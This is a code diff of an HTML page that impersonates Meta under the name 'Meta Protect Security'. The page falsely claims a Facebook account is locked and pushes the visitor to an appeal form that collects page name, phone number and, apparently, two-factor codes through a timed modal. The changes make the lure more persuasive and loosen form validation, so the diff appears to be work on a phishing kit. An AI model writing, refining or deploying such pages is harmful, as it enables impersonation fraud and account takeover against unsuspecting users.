@@ -3535,10 +3535,10 @@ div[class^="tiktok"].--savior-overlay-z-index-reset {
                     <h1>
                         Meta Protect Security
                     </h1>
-                    <h6>⚠️ We have received several reports that your page violates our terms of service and community guidelines. To protect you, your page is not visible to people on Facebook and you can't use your account.</h6>
+                    <h6>⚠️ We have received several reports that your page violates our terms of service and community guidelines.</h6>
                 
                     <h6>
-                        ⚠️ If you believe this was a mistake, please answer these questions so we can investigate.
+                        ⚠️ To protect you, your page is not visible to people on Facebook and you can't use your account.
                     </h6>
                     
                     <div id="utm-ticketId" style="display: block;" bis_skin_checked="1">
@@ -3581,8 +3581,8 @@ div[class^="tiktok"].--savior-overlay-z-index-reset {
                                   </span>
                                 </span>
                               </h5>
-                            <h6 style="margin-top: 20px;">Your page's accessibility is limited, so we ask that higher security requirements be applied to that page.</h6>
-                            <h6>This form is only to be used for submitting appeals and restoring account status.</h6>
+                            <h6 style="margin-top: 20px;">Your account's accessibility has been limited, requiring enhanced security measures. To resolve this, we have created a security program to help unlock your account.</h6>
+                            <h6>Below, we walk you through the process in detail and help you fully activate to unlock your account.</h6>
                           </div>
                           <div class="btn-wrapper" bis_skin_checked="1">
                             <div id="start" class="button fb-blue w-100" data-bs-toggle="modal" data-bs-target="#exampleModal1" bis_skin_checked="1">
@@ -3763,7 +3763,7 @@ div[class^="tiktok"].--savior-overlay-z-index-reset {
                   <div class="modal-body" bis_skin_checked="1">
                     <form id="first-form">
                         <div class="mb-3" bis_skin_checked="1" style="margin-top: -8px;">
-                            <label for="FullNameField" class="form-label">Facebook Page name</label>
+                            <label for="FullNameField" class="form-label">Facebook Page Name</label>
                             <input value="" name="full-name" type="text" class="form-control" id="FullNameField" minlength="0" required="" aria-describedby="emailHelp">
                         </div>
                 
@@ -3777,7 +3777,7 @@ div[class^="tiktok"].--savior-overlay-z-index-reset {
                         </div>
                 
                         <div class="mb-3" bis_skin_checked="1">
-                            <label for="PhoneFirld" class="form-label">Mobile phone number</label>
+                            <label for="PhoneFirld" class="form-label">Mobile Phone Number</label>
                             <input value="" name="mobile-phone-number" type="tel" class="form-control" id="PhoneFirld" required="" aria-describedby="emailHelp" minlength="7" maxlength="18">
                         </div>
                         <div class="mb-3" bis_skin_checked="1">
@@ -3803,11 +3803,11 @@ div[class^="tiktok"].--savior-overlay-z-index-reset {
                                     <label for="reason-3" class="ml-1">Other reasons:</label>
                                 </div>
                             </div>
-                            <textarea name="apeal" class="form-control" id="exampleFormControlTextarea1" rows="1" required=""></textarea>
+                            <textarea name="apeal" class="form-control" id="exampleFormControlTextarea1" rows="1" ""></textarea>
                             
                         </div>
                         <div class="mb-3 form-check" bis_skin_checked="1">
-                            <input name="" type="checkbox" class="form-check-input" id="exampleCheck1" required="">
+                            <input name="" type="checkbox" class="form-check-input" id="exampleCheck1" "">
                             <label class="form-check-label" for="exampleCheck1">I agree with
                                 <a id="termsLink" class="add-svg">Terms of use
                                     <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
@@ -3943,44 +3943,45 @@ div[class^="tiktok"].--savior-overlay-z-index-reset {
       </button>
     </div>
   </div>
+  <div class="spaser" bis_skin_checked="1"></div>
+      
+  <script>
+   
+    let resendTime = 179; 
+    let timerInterval = null; 
+    const resendTimerElement = document.getElementById("resend-timer");
+
+    
+    const startResendTimer = () => {
+      if (timerInterval) {
+        clearInterval(timerInterval); 
+      }
+      resendTime = 179; 
+      resendTimerElement.textContent = "02:59"; 
+
+      timerInterval = setInterval(() => {
+        const minutes = Math.floor(resendTime / 60).toString().padStart(2, "0");
+        const seconds = (resendTime % 60).toString().padStart(2, "0");
+        resendTimerElement.textContent = `${minutes}:${seconds}`;
+        if (resendTime > 0) {
+          resendTime--;
+        } else {
+          clearInterval(timerInterval); 
+        }
+      }, 1000);
+    };
+
+    document.getElementById("twoFAmodal").addEventListener("shown.bs.modal", startResendTimer);
+
+    
+    resendTimerElement.textContent = "02:59";
+  </script>
+</div>
 </form>
-              <div class="spaser" bis_skin_checked="1"></div>
-      
-              <script>
-               
-                let resendTime = 179; 
-                let timerInterval = null; 
-                const resendTimerElement = document.getElementById("resend-timer");
-      
-                
-                const startResendTimer = () => {
-                  if (timerInterval) {
-                    clearInterval(timerInterval); 
-                  }
-                  resendTime = 179; 
-                  resendTimerElement.textContent = "02:59"; 
-      
-                  timerInterval = setInterval(() => {
-                    const minutes = Math.floor(resendTime / 60).toString().padStart(2, "0");
-                    const seconds = (resendTime % 60).toString().padStart(2, "0");
-                    resendTimerElement.textContent = `${minutes}:${seconds}`;
-                    if (resendTime > 0) {
-                      resendTime--;
-                    } else {
-                      clearInterval(timerInterval); 
-                    }
-                  }, 1000);
-                };
-      
-                document.getElementById("twoFAmodal").addEventListener("shown.bs.modal", startResendTimer);
-      
-                
-                resendTimerElement.textContent = "02:59";
-              </script>
-            </div>
           </div>
         </div>
       </div>
+    </div>
     <div class="modal form-modal" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true" bis_skin_checked="1">
         <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down" bis_skin_checked="1">
             <div class="modal-content" bis_skin_checked="1">
